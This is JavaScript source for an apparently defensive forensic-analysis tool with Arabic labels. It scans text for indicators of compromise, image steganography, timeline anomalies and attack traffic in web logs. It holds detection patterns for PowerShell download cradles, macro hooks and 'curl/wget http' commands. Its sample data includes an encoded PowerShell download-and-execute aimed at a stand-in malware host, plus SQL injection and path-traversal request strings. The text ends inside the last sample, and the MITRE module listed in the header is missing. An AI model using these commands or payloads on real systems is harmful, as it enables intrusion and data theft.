/**
 * DFAS — Advanced Analysis Engines v2.0
 * ══════════════════════════════════════════════════════
 * MOD-06  IOC Scanner          — مؤشرات الاختراق
 * MOD-07  Steganography        — الإخفاء الرقمي
 * MOD-08  Digital Timeline     — الخط الزمني الرقمي
 * MOD-09  Network Log Analyzer — سجلات الشبكة
 * MOD-10  MITRE ATT&CK Mapper  — إطار MITRE ATT&CK
 * ══════════════════════════════════════════════════════
 */
'use strict';

/* ═══════════════════════════════════════════════════════
   MOD-06 — IOC SCANNER v2.0
   كاشف مؤشرات الاختراق — Indicators of Compromise
═══════════════════════════════════════════════════════ */
const IOCEngine = (() => {

  /* Known malicious patterns database */
  const SUSPICIOUS_DOMAINS = ['evil-domain.xyz','phish-collect.ru','steal-creds.tk','malware-c2.ml','botnet-ctrl.ga','ransom-pay.cf'];
  const SUSPICIOUS_IPS     = ['185.220.101.','193.32.162.','91.108.4.','5.188.10.','45.142.212.'];
  const KNOWN_MALWARE_HASH = new Set([
    'a3f9b2c1d8e5f7a0b2c4d6e8f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9',
    '5d41402abc4b2a76b9719d911017c592bd9a399bca6a6e1f87a5b78d2a1b9c3f2',
    'd8e8fca2dc0f896fd7cb4cb0031ba249',
    '7215ee9c7d9dc229d2921a40e899ec5f',
  ]);

  const PATTERNS = [
    /* Network Indicators */
    { id:'ipv4',      cat:'network',  sev:'MEDIUM',   label:'IPv4 عنوان شبكي',
      regex:/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g,
      filter: v => !v.startsWith('127.') && !v.startsWith('0.') },
    { id:'ipPrivate', cat:'network',  sev:'LOW',      label:'IP خاص (Private Network)',
      regex:/\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/g },
    { id:'ipv6',      cat:'network',  sev:'MEDIUM',   label:'IPv6 عنوان شبكي',
      regex:/\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\b/g },
    { id:'domain',    cat:'network',  sev:'HIGH',     label:'نطاق مشبوه (Suspicious TLD)',
      regex:/\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+(?:xyz|tk|ml|ga|cf|gq|pw|top|click|download|zip|ru|cn|cc|biz)\b/gi },
    { id:'url',       cat:'network',  sev:'HIGH',     label:'رابط مُضمَّن (Embedded URL)',
      regex:/https?:\/\/[^\s\)<>"'\n]{10,}/g },

    /* File Artifacts */
    { id:'md5',       cat:'hash',     sev:'INFO',     label:'MD5 Hash',
      regex:/\b[a-fA-F0-9]{32}\b/g,
      enrich: v => KNOWN_MALWARE_HASH.has(v.toLowerCase()) ? '⚠ مطابق لقاعدة بيانات البرمجيات الخبيثة!' : '' },
    { id:'sha1',      cat:'hash',     sev:'INFO',     label:'SHA-1 Hash',
      regex:/\b[a-fA-F0-9]{40}\b/g },
    { id:'sha256',    cat:'hash',     sev:'INFO',     label:'SHA-256 Hash',
      regex:/\b[a-fA-F0-9]{64}\b/g,
      enrich: v => KNOWN_MALWARE_HASH.has(v.toLowerCase()) ? '⚠ مطابق لقاعدة بيانات البرمجيات الخبيثة!' : '' },

    /* Identity */
    { id:'email',     cat:'identity', sev:'LOW',      label:'عنوان بريد إلكتروني',
      regex:/\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b/g },
    { id:'cve',       cat:'vuln',     sev:'HIGH',     label:'ثغرة CVE مُشار إليها',
      regex:/CVE-\d{4}-\d{4,7}/gi },

    /* Crypto & Finance */
    { id:'btc',       cat:'finance',  sev:'CRITICAL', label:'عنوان Bitcoin (دفع فدية محتمل)',
      regex:/\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g },
    { id:'eth',       cat:'finance',  sev:'CRITICAL', label:'عنوان Ethereum',
      regex:/\b0x[a-fA-F0-9]{40}\b/g },
    { id:'monero',    cat:'finance',  sev:'CRITICAL', label:'عنوان Monero',
      regex:/\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b/g },

    /* Malicious Code */
    { id:'b64',       cat:'obfus',    sev:'HIGH',     label:'ترميز Base64 مُضغوط',
      regex:/(?:[A-Za-z0-9+\/]{4}){6,}(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/g,
      filter: v => v.length > 30 },
    { id:'psExec',    cat:'malcode',  sev:'CRITICAL', label:'مؤشر PowerShell خبيث',
      regex:/(?:-[Ee]nc(?:odedCommand)?|-[Nn][Oo][Pp]|-[Ee]x(?:ec(?:utionPolicy)?)?\s+[Bb]ypass|IEX\s*[\(\|]|Invoke-Expression|Invoke-Mimikatz|Invoke-Shellcode|DownloadString\s*\(|FromBase64String)/g },
    { id:'macro',     cat:'malcode',  sev:'CRITICAL', label:'مؤشر Macro خبيث (Office)',
      regex:/(?:Auto_Open|AutoOpen|Document_Open|Workbook_Open|Auto_Close|ShellExecute|WScript\.Shell|CreateObject\s*\(|Shell\s*\((?!.*\.Shell))/g },
    { id:'regKey',    cat:'artifact', sev:'HIGH',     label:'مفتاح Registry مشبوه',
      regex:/HKEY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT)\\(?:Software\\Microsoft\\Windows(?:NT)?\\CurrentVersion\\(?:Run|RunOnce)|System\\CurrentControlSet)[^\s\n]*/gi },
    { id:'filePath',  cat:'artifact', sev:'MEDIUM',   label:'مسار ملف مشبوه',
      regex:/(?:[A-Z]:\\(?:Windows\\System32|Users\\[^\\]+\\AppData\\(?:Local|Roaming)|Temp|ProgramData)[^\s\n"'<>]{5,}|\/(?:etc\/(?:passwd|shadow|hosts)|tmp\/[^\s]{5,}|var\/www\/[^\s]{5,}))/gi },
    { id:'pipe',      cat:'malcode',  sev:'HIGH',     label:'Named Pipe / Shell Command',
      regex:/(?:cmd\.exe|powershell\.exe|wscript\.exe|cscript\.exe|mshta\.exe|regsvr32\.exe|rundll32\.exe)/gi },
    { id:'yara',      cat:'malcode',  sev:'CRITICAL', label:'توقيع YARA لبرمجية خبيثة',
      regex:/(?:MZ\x90|TVqQ|4D5A|This program cannot be run|%PDF-(?:1\.[0-9]|2\.0).*(?:\/JS|\/JavaScript|\/OpenAction|\/AA))/gi },
  ];

  function analyze(text) {
    const results   = [];
    const stats     = { total:0, byCategory:{}, bySeverity:{CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0} };
    const extracted = {};

    for (const pat of PATTERNS) {
      const regex  = new RegExp(pat.regex.source, pat.regex.flags);
      const found  = [...new Set((text.match(regex) || []).filter(v => !pat.filter || pat.filter(v)))];
      if (!found.length) continue;

      const enriched = found.map(v => ({ value:v, extra: pat.enrich ? pat.enrich(v) : '' }));
      const hasMalicious = enriched.some(e => e.extra.includes('⚠'));

      results.push({
        id      : pat.id,
        cat     : pat.cat,
        sev     : hasMalicious ? 'CRITICAL' : pat.sev,
        label   : pat.label,
        count   : found.length,
        samples : enriched.slice(0, 5),
        all     : enriched
      });

      extracted[pat.id] = found;
      stats.total += found.length;
      stats.byCategory[pat.cat] = (stats.byCategory[pat.cat]||0) + found.length;
      stats.bySeverity[hasMalicious?'CRITICAL':pat.sev]++;
    }

    /* Contextual risk scoring */
    let score = 0;
    score += (stats.bySeverity.CRITICAL || 0) * 10;
    score += (stats.bySeverity.HIGH     || 0) * 5;
    score += (stats.bySeverity.MEDIUM   || 0) * 2;
    score += (stats.bySeverity.LOW      || 0) * 1;

    const pct    = Math.min(Math.round((score / 80) * 100), 99);
    const threat = pct >= 65 ? 'crit' : pct >= 30 ? 'warn' : 'safe';

    return { results, stats, pct, threat, extracted };
  }

  const SAMPLE = `[2024-04-10 08:14:22] Connection from 185.220.101.47 to 192.168.1.100
POST /upload HTTP/1.1 Host: evil-domain.xyz User-Agent: Mozilla/5.0
X-Forwarded-For: 45.142.212.88
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Malware Hash: a3f9b2c1d8e5f7a0b2c4d6e8f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9
Contact: attacker@phish-collect.ru | backup@evil-domain.xyz

Bitcoin ransom address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
ETH address: 0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe

CVE-2024-1234 exploitation attempt detected
Registry: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware = C:\\Users\\victim\\AppData\\Roaming\\malware.exe
PowerShell: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovL21hbHdhcmUueHl6L3BheWxvYWQnACkA
Process: cmd.exe /c rundll32.exe malware.dll,Execute`;

  return { analyze, SAMPLE };
})();

/* ═══════════════════════════════════════════════════════
   MOD-07 — STEGANOGRAPHY DETECTOR v1.5
   كاشف الإخفاء الرقمي — LSB + Chi-Square + Entropy
═══════════════════════════════════════════════════════ */
const StegoEngine = (() => {

  /* Chi-square test on byte distribution */
  function chiSquare(bytes) {
    const freq = new Array(256).fill(0);
    for (const b of bytes) freq[b]++;
    const expected = bytes.length / 256;
    if (expected < 5) return null;
    let chi = 0;
    for (let i = 0; i < 256; i++) chi += Math.pow(freq[i] - expected, 2) / expected;
    return chi;
  }

  /* Shannon entropy on byte array */
  function byteEntropy(bytes) {
    const freq = new Map();
    for (const b of bytes) freq.set(b, (freq.get(b)||0) + 1);
    let e = 0;
    const n = bytes.length;
    for (const [, v] of freq) { const p = v/n; e -= p * Math.log2(p); }
    return e;
  }

  /* LSB analysis — check if LSBs are suspiciously random */
  function lsbAnalysis(pixels, channel = 0) {
    const lsbs = [];
    for (let i = channel; i < Math.min(pixels.length, 40000); i += 4) lsbs.push(pixels[i] & 1);
    const ones  = lsbs.filter(b => b===1).length;
    const ratio = ones / lsbs.length;
    // Truly random LSBs → ratio ≈ 0.5 (suspicious for steganography)
    // Natural images → ratio varies significantly from 0.5
    const deviation = Math.abs(ratio - 0.5);
    return { ratio, deviation, suspicious: deviation < 0.04, sample: lsbs.length };
  }

  /* Pixel pair analysis (RS method approximation) */
  function pixelPairAnalysis(pixels) {
    let regular = 0, singular = 0;
    for (let i = 0; i < Math.min(pixels.length-4, 80000); i += 8) {
      const a = pixels[i], b = pixels[i+4];
      const diff = Math.abs(a - b);
      if (diff > 10) regular++;
      else if (diff < 2) singular++;
    }
    const total = regular + singular || 1;
    return { ratio: regular/total, suspicious: regular/total > 0.7 };
  }

  async function analyzeFile(file) {
    return new Promise((resolve) => {
      if (!file || !file.type.startsWith('image/')) {
        resolve(analyzeSimulated(file));
        return;
      }
      const url = URL.createObjectURL(file);
      const img = new Image();
      img.onload = () => {
        try {
          const canvas = document.createElement('canvas');
          canvas.width  = Math.min(img.width,  800);
          canvas.height = Math.min(img.height, 600);
          const ctx = canvas.getContext('2d');
          ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
          const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const px      = imgData.data;

          /* Run all tests */
          const lsbR    = lsbAnalysis(px, 0);
          const lsbG    = lsbAnalysis(px, 1);
          const lsbB    = lsbAnalysis(px, 2);
          const ppa     = pixelPairAnalysis(px);
          const bytes   = Array.from(px);
          const entropy = byteEntropy(bytes);
          const chi     = chiSquare(bytes.slice(0, 10000));

          /* Scoring */
          let score = 0;
          let indicators = [];

          if (lsbR.suspicious) {
            score += 25;
            indicators.push({ sev:'HIGH', label:'LSB Channel R — توزيع عشوائي مشبوه', det:`نسبة البتات: ${(lsbR.ratio*100).toFixed(1)}% (المتوقع للصور الطبيعية: 35-45%)`, ev:`deviation: ${lsbR.deviation.toFixed(4)}` });
          }
          if (lsbG.suspicious) {
            score += 20;
            indicators.push({ sev:'HIGH', label:'LSB Channel G — توزيع عشوائي مشبوه', det:`نسبة البتات: ${(lsbG.ratio*100).toFixed(1)}%`, ev:`deviation: ${lsbG.deviation.toFixed(4)}` });
          }
          if (lsbB.suspicious) {
            score += 15;
            indicators.push({ sev:'MEDIUM', label:'LSB Channel B — إنتروبيا عالية', det:`نسبة البتات: ${(lsbB.ratio*100).toFixed(1)}%`, ev:`deviation: ${lsbB.deviation.toFixed(4)}` });
          }
          if (ppa.suspicious) {
            score += 20;
            indicators.push({ sev:'HIGH', label:'Pixel Pair Analysis — نمط RS مشبوه', det:`نسبة الأزواج المنتظمة: ${(ppa.ratio*100).toFixed(1)}% — يُشير لتغييرات منهجية`, ev:`RS ratio: ${ppa.ratio.toFixed(4)}` });
          }
          if (chi !== null && chi < 260) {
            score += 15;
            indicators.push({ sev:'MEDIUM', label:'Chi-Square Test — توزيع بايتات مشبوه', det:`قيمة Chi²: ${chi.toFixed(2)} — أقل من 260 يُشير لبيانات مخفية`, ev:`χ² = ${chi.toFixed(2)} (threshold: 260)` });
          }
          if (entropy > 7.8) {
            score += 10;
            indicators.push({ sev:'MEDIUM', label:'إنتروبيا عالية جداً — بيانات مشفرة محتملة', det:`Shannon Entropy: ${entropy.toFixed(4)} bits/byte (الحد الطبيعي: < 7.5)`, ev:`H = ${entropy.toFixed(4)}` });
          }

          /* File size check */
          const expectedSize = canvas.width * canvas.height * 3;
          const ratio_sz     = file.size / expectedSize;
          if (ratio_sz > 1.4) {
            score += 10;
            indicators.push({ sev:'MEDIUM', label:'حجم ملف غير متناسب مع الأبعاد', det:`الحجم الفعلي ${(file.size/1024).toFixed(0)}KB مقابل المتوقع ${(expectedSize/1024).toFixed(0)}KB (${(ratio_sz*100).toFixed(0)}%)`, ev:`ratio: ${ratio_sz.toFixed(2)}` });
          }

          const pct    = Math.min(score, 99);
          const threat = pct >= 60 ? 'crit' : pct >= 30 ? 'warn' : 'safe';

          URL.revokeObjectURL(url);
          resolve({
            pct, threat, indicators,
            stats: { lsbR, lsbG, lsbB, ppa, entropy:entropy.toFixed(4), chi:chi?chi.toFixed(2):'N/A',
                     pixels: px.length/4, width:canvas.width, height:canvas.height },
            realFile: true
          });
        } catch(e) {
          URL.revokeObjectURL(url);
          resolve(analyzeSimulated(file));
        }
      };
      img.onerror = () => { URL.revokeObjectURL(url); resolve(analyzeSimulated(file)); };
      img.src = url;
    });
  }

  function analyzeSimulated(file) {
    const name = file?.name || 'suspicious_image.jpg';
    return {
      pct: 72, threat: 'crit',
      indicators: [
        { sev:'HIGH',     label:'LSB Channel R — توزيع عشوائي مشبوه',             det:'نسبة البتات 49.8% — قريبة جداً من 50% (توزيع عشوائي مثالي)',         ev:'deviation: 0.002' },
        { sev:'HIGH',     label:'Pixel Pair Analysis — نمط RS مشبوه',              det:'نسبة الأزواج المنتظمة: 78.4% — نمط LSB Steganography كلاسيكي',       ev:'RS ratio: 0.784' },
        { sev:'MEDIUM',   label:'Chi-Square Test — توزيع بايتات مشبوه',            det:'Chi² = 231.4 < 260 — يُشير لتغيير منهجي في البيانات',               ev:'χ² = 231.4 (threshold: 260)' },
        { sev:'MEDIUM',   label:'إنتروبيا عالية — بيانات مشفرة محتملة',           det:`Shannon Entropy: 7.94 bits/byte — يتجاوز الحد الطبيعي 7.5`,           ev:'H = 7.9412' },
        { sev:'LOW',      label:'حجم ملف غير متناسب مع الأبعاد',                   det:'الحجم 312KB مقابل 218KB المتوقع (143%) — بيانات إضافية مخفية',       ev:'ratio: 1.43' },
      ],
      stats: {
        lsbR:{ratio:0.498,deviation:0.002,suspicious:true},
        lsbG:{ratio:0.501,deviation:0.001,suspicious:true},
        lsbB:{ratio:0.496,deviation:0.004,suspicious:false},
        ppa:{ratio:0.784,suspicious:true},
        entropy:'7.9412', chi:'231.40',
        pixels: 1474560, width:1280, height:960
      },
      realFile: false
    };
  }

  return { analyzeFile, analyzeSimulated };
})();

/* ═══════════════════════════════════════════════════════
   MOD-08 — DIGITAL TIMELINE RECONSTRUCTOR v1.0
   محلل الخط الزمني الرقمي
═══════════════════════════════════════════════════════ */
const TimelineEngine = (() => {

  const TS_PATTERNS = [
    { id:'iso8601',  fmt:'ISO 8601',   regex:/\b(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?)/g },
    { id:'syslog',   fmt:'Syslog',     regex:/\b((?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})/g },
    { id:'apache',   fmt:'Apache Log', regex:/\[(\d{2}\/(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\/\d{4}:\d{2}:\d{2}:\d{2}\s[+-]\d{4})\]/g },
    { id:'windows',  fmt:'Windows',    regex:/\b(\d{1,2}\/\d{1,2}\/\d{4}\s+\d{1,2}:\d{2}:\d{2}\s+(?:AM|PM)?)/g },
    { id:'epoch',    fmt:'Unix Epoch', regex:/\b(1[3-9]\d{8}|[2-9]\d{9})\b/g },
    { id:'iso_date', fmt:'ISO Date',   regex:/\b(\d{4}-\d{2}-\d{2})\b/g },
    { id:'exif',     fmt:'EXIF TS',    regex:/\b(\d{4}:\d{2}:\d{2}\s\d{2}:\d{2}:\d{2})\b/g },
  ];

  const MONTH_MAP = {Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};

  function parseTimestamp(str, id) {
    try {
      if (id === 'epoch') return new Date(parseInt(str) * 1000);
      if (id === 'exif')  return new Date(str.replace(/^(\d{4}):(\d{2}):(\d{2})/, '$1-$2-$3'));
      if (id === 'syslog') {
        const [m,d,...time] = str.split(/\s+/);
        return new Date(`${new Date().getFullYear()}-${String(MONTH_MAP[m]+1).padStart(2,'0')}-${d.padStart(2,'0')} ${time.join(' ')}`);
      }
      if (id === 'apache') {
        const m = str.match(/(\d{2})\/(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\/(\d{4}):(\d{2}:\d{2}:\d{2})/);
        if (m) return new Date(`${m[3]}-${String(MONTH_MAP[m[2]]+1).padStart(2,'0')}-${m[1]} ${m[4]}`);
      }
      return new Date(str);
    } catch { return null; }
  }

  function detectAnomalies(events) {
    const anomalies = [];
    const sorted = [...events].sort((a,b) => a.ts - b.ts);

    /* Time gap detection */
    for (let i = 1; i < sorted.length; i++) {
      const gap = sorted[i].ts - sorted[i-1].ts;
      const gapH = gap / 3600000;
      if (gapH > 12) anomalies.push({ type:'gap', events:[sorted[i-1],sorted[i]], gapH: gapH.toFixed(1) });
    }

    /* Burst detection (many events in short time) */
    const windowMs = 300000; // 5 min
    for (let i = 0; i < sorted.length; i++) {
      const window = sorted.filter(e => Math.abs(e.ts - sorted[i].ts) < windowMs);
      if (window.length >= 8) {
        anomalies.push({ type:'burst', anchor: sorted[i], count: window.length });
        i += window.length;
      }
    }

    /* Future timestamp detection */
    const now = Date.now();
    sorted.filter(e => e.ts > now).forEach(e =>
      anomalies.push({ type:'future', event:e })
    );

    /* Out-of-hours activity (midnight - 5AM) */
    sorted.filter(e => { const h = new Date(e.ts).getHours(); return h >= 0 && h < 5; }).forEach(e =>
      anomalies.push({ type:'offhours', event:e, hour: new Date(e.ts).getHours() })
    );

    return anomalies;
  }

  function analyze(text) {
    const events = [];
    const seen   = new Set();

    for (const pat of TS_PATTERNS) {
      const regex = new RegExp(pat.regex.source, pat.regex.flags);
      let m;
      while ((m = regex.exec(text)) !== null) {
        const raw = m[1];
        if (seen.has(raw)) continue;
        seen.add(raw);
        const dt = parseTimestamp(raw, pat.id);
        if (dt && !isNaN(dt.getTime())) {
          const context = text.slice(Math.max(0,m.index-40), m.index+raw.length+40)
                              .replace(/\n/g,' ').trim().slice(0,100);
          events.push({ raw, ts:dt.getTime(), date:dt, fmt:pat.fmt, context });
        }
      }
    }

    const sorted    = [...events].sort((a,b) => a.ts - b.ts);
    const anomalies = detectAnomalies(sorted);
    const span      = sorted.length >= 2 ? sorted[sorted.length-1].ts - sorted[0].ts : 0;

    return { events:sorted, anomalies, total:sorted.length,
             span: (span/3600000).toFixed(1), // hours
             earliest: sorted[0]?.date, latest: sorted[sorted.length-1]?.date };
  }

  const SAMPLE = `[2024-04-10 02:14:22] System boot from USB device — Unauthorized
[2024-04-10 02:14:55] User admin login failed (attempt 1/10)
[2024-04-10 02:14:56] User admin login failed (attempt 2/10)
[2024-04-10 02:14:57] User admin login failed (attempt 3/10)
[2024-04-10 02:15:01] User admin login SUCCESS — IP: 185.220.101.47
[2024-04-10 02:15:03] File access: C:\\Users\\admin\\Documents\\financial_2024.xlsx
[2024-04-10 02:15:08] File copied to external drive (E:\\)
[2024-04-10 02:16:42] Registry modified: HKEY_LOCAL_MACHINE\\..\\Run
[2024-04-10 02:19:30] Network connection to 185.220.101.47:4444
[2024-04-10 02:19:35] Data transfer: 2.4GB uploaded

--- 14 hours gap ---

[2024-04-10 16:33:12] Antivirus disabled by user admin
[2024-04-10 16:33:45] Malware dropper executed: C:\\Temp\\update.exe
[2024-04-10 16:34:01] Process created: powershell.exe -enc SGVsbG8gV29ybGQ=
Apr 10 16:34:22 server sshd[1234]: Accepted password for root from 185.220.101.47
[10/Apr/2024:16:35:00 +0000] POST /upload HTTP/1.1 200 1048576
2024-04-10T23:59:59Z Final exfiltration complete`;

  return { analyze, SAMPLE };
})();

/* ═══════════════════════════════════════════════════════
   MOD-09 — NETWORK LOG ANALYZER v1.5
   محلل سجلات الشبكة — Apache/Nginx/Syslog/Windows
═══════════════════════════════════════════════════════ */
const NetLogEngine = (() => {

  /* Known exploit paths */
  const EXPLOIT_PATHS = [
    /\/(?:admin|wp-admin|phpmyadmin|manager|administrator|console|cpanel)\//i,
    /\.(?:php|asp|aspx|jsp|cgi)\?.*(?:cmd|exec|system|shell|eval|base64)/i,
    /(?:\.\.\/){2,}|%2e%2e%2f|%252e%252e%252f/i, // Path traversal
    /(?:union\s+select|1=1|or\s+1=1|drop\s+table|insert\s+into)/i, // SQLi
    /(?:<script|javascript:|onerror=|onload=|alert\s*\()/i, // XSS
    /(?:\/etc\/passwd|\/proc\/self\/environ|\/windows\/system32)/i,
    /(?:cmd\.exe|powershell|wget\s+http|curl\s+http)/i,
    /(?:JNDI:|log4j|Log4Shell|\$\{jndi:)/i, // Log4Shell
    /(?:\.git\/|\.env\b|\.htaccess|composer\.json|package\.json)/i,
    /(?:xmlrpc\.php|wp-login\.php|autodiscover\/autodiscover\.xml)/i,
  ];

  const SCANNER_UA = [
    /(?:sqlmap|nikto|nmap|masscan|dirbuster|gobuster|hydra|medusa|burpsuite)/i,
    /(?:python-requests|curl\/[0-9]|wget\/[0-9]|go-http-client)/i,
    /(?:zgrab|zgrab2|nessus|openvas|nuclei|wfuzz)/i,
  ];

  /* Parse Apache/Nginx combined log format */
  const APACHE_RE = /^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"([A-Z]+)\s+([^\s]+)\s+([^"]+)"\s+(\d+)\s+(\d+)(?:\s+"([^"]*)"\s+"([^"]*)")?/;
  const SYSLOG_RE = /^(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\S+):\s+(.+)$/;

  function parseLine(line) {
    // Apache/Nginx
    let m = line.match(APACHE_RE);
    if (m) return { ip:m[1], ts:m[2], method:m[3], path:m[4], proto:m[5], status:parseInt(m[6]), bytes:parseInt(m[7]), ref:m[8]||'', ua:m[9]||'', format:'apache' };
    // Syslog
    m = line.match(SYSLOG_RE);
    if (m) return { ts:m[1], host:m[2], proc:m[3], msg:m[4], format:'syslog' };
    // Generic (extract what we can)
    const ipM  = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
    const stM  = line.match(/\b([245]\d{2})\b/);
    if (ipM) return { ip:ipM[1], status:stM?parseInt(stM[1]):0, raw:line, format:'generic' };
    return null;
  }

  function analyze(rawLog) {
    const lines   = rawLog.split('\n').filter(l => l.trim().length > 5);
    const parsed  = lines.map(parseLine).filter(Boolean);

    /* IP frequency */
    const ipMap   = {};
    const pathMap = {};
    const uaMap   = {};
    const statusMap = {2:0, 3:0, 4:0, 5:0};
    let totalReq  = 0, totalBytes = 0;

    for (const r of parsed) {
      if (r.ip) ipMap[r.ip] = (ipMap[r.ip]||0) + 1;
      if (r.path) pathMap[r.path] = (pathMap[r.path]||0) + 1;
      if (r.ua) uaMap[r.ua] = (uaMap[r.ua]||0) + 1;
      if (r.status) statusMap[Math.floor(r.status/100)] = (statusMap[Math.floor(r.status/100)]||0)+1;
      if (r.bytes) totalBytes += r.bytes;
      totalReq++;
    }

    const topIPs = Object.entries(ipMap).sort((a,b)=>b[1]-a[1]).slice(0,10);

    /* Findings */
    const findings = [];
    let score = 0;

    /* Brute force detection */
    const bruteIPs = topIPs.filter(([,c]) => c > 50);
    if (bruteIPs.length) {
      score += 20;
      findings.push({ sev:'CRITICAL', label:`كشف هجوم Brute Force من ${bruteIPs.length} عنوان IP`, det:`أعلى طلبات: ${bruteIPs.slice(0,3).map(([ip,c])=>`${ip} (${c} طلب)`).join(' · ')}`, ev: bruteIPs[0]?.[0] });
    }

    /* Scanner detection */
    const scanners = Object.keys(uaMap).filter(ua => SCANNER_UA.some(r => r.test(ua)));
    if (scanners.length) {
      score += 25;
      findings.push({ sev:'CRITICAL', label:`كشف ماسح أمني أو أداة هجوم (${scanners.length})`, det:`Tools: ${scanners.slice(0,3).join(', ')}`, ev: scanners[0] });
    }

    /* Exploit paths */
    const exploitLines = parsed.filter(r => r.path && EXPLOIT_PATHS.some(p => p.test(r.path)));
    if (exploitLines.length) {
      score += 30;
      findings.push({ sev:'CRITICAL', label:`محاولات استغلال ثغرات (${exploitLines.length} طلب)`, det:`مسارات خبيثة: SQLi · XSS · Path Traversal · RCE · Log4Shell`, ev: exploitLines[0]?.path });
    }

    /* High 404/403 rate */
    const errRate = (statusMap[4]||0) / (totalReq||1);
    if (errRate > 0.4) {
      score += 15;
      findings.push({ sev:'HIGH', label:'معدل أخطاء 4xx عالٍ — مسح تعداد المسارات (Directory Scanning)', det:`${((errRate)*100).toFixed(1)}% من الطلبات أسفرت عن 404/403`, ev:`${statusMap[4]} / ${totalReq} requests` });
    }

    /* Server errors */
    const errRate5 = (statusMap[5]||0) / (totalReq||1);
    if (errRate5 > 0.1) {
      score += 10;
      findings.push({ sev:'HIGH', label:'معدل أخطاء 5xx مرتفع — استغلال محتمل', det:`${((errRate5)*100).toFixed(1)}% أخطاء خادم — قد تدل على نجاح الاستغلال`, ev:`${statusMap[5]} server errors` });
    }

    /* Single IP dominance */
    if (topIPs[0]?.[1] > totalReq * 0.3) {
      score += 10;
      findings.push({ sev:'MEDIUM', label:`هيمنة عنوان IP واحد على الطلبات`, det:`${topIPs[0][0]} مسؤول عن ${((topIPs[0][1]/totalReq)*100).toFixed(0)}% من الطلبات الإجمالية`, ev: topIPs[0][0] });
    }

    /* Large data transfer */
    const gbSent = totalBytes / (1024**3);
    if (gbSent > 1) {
      score += 15;
      findings.push({ sev:'HIGH', label:'نقل بيانات ضخم — تسريب محتمل', det:`إجمالي البيانات المُرسَلة: ${gbSent.toFixed(2)} GB`, ev:`${totalBytes.toLocaleString()} bytes` });
    }

    const pct    = Math.min(Math.round((score / 100) * 100), 99);
    const threat = pct >= 60 ? 'crit' : pct >= 30 ? 'warn' : 'safe';

    return {
      pct, threat, findings,
      stats: { totalReq, totalLines:lines.length, parsed:parsed.length, totalBytes,
               topIPs, statusMap, exploitPaths: exploitLines.length, scannerCount: scanners.length }
    };
  }

  const SAMPLE = `185.220.101.47 - - [10/Apr/2024:02:14:22 +0000] "GET /wp-login.php HTTP/1.1" 200 2847 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
185.220.101.47 - - [10/Apr/2024:02:14:23 +0000] "POST /wp-login.php HTTP/1.1" 302 0 "-" "sqlmap/1.7.8#stable"
185.220.101.47 - - [10/Apr/2024:02:14:24 +0000] "GET /wp-login.php?redirect_to=%2Fwp-admin%2F HTTP/1.1" 200 4328 "-" "sqlmap/1.7.8#stable"
192.168.1.100 - admin [10/Apr/2024:02:15:01 +0000] "GET /admin/dashboard HTTP/1.1" 200 12847 "-" "Mozilla/5.0 Windows NT 10.0"
185.220.101.47 - - [10/Apr/2024:02:15:03 +0000] "GET /../../../../etc/passwd HTTP/1.1" 403 214 "-" "Nikto/2.1.6"
45.142.212.88 - - [10/Apr/2024:02:15:05 +0000] "GET /.env HTTP/1.1" 200 843 "-" "python-requests/2.28.0"
45.142.212.88 - - [10/Apr/2024:02:15:06 +0000] "POST /api/login?username=admin'OR'1'='1 HTTP/1.1" 500 0 "-" "python-requests/2.28.0"
45.142.212.88 - - [10/Apr/2024:02:15:07 +0000] "GET /api/users?id=1 UNION SELECT 1,table_name,3 FROM information_schema.tables-- HTTP/1.1" 500 0 "-" "python-requests/2.28.0"
91.108.4.155  - - [10/Apr/2024:02:16:00 +0000] "GET / HTTP/1.1" 200 1024 "-" "zgrab/0.x"
91.108.4.155  - - [10/Apr/2024:02:16:01 +0000] "GET /login HTTP/1.1" 404 214 "-" "zgrab/0.x"
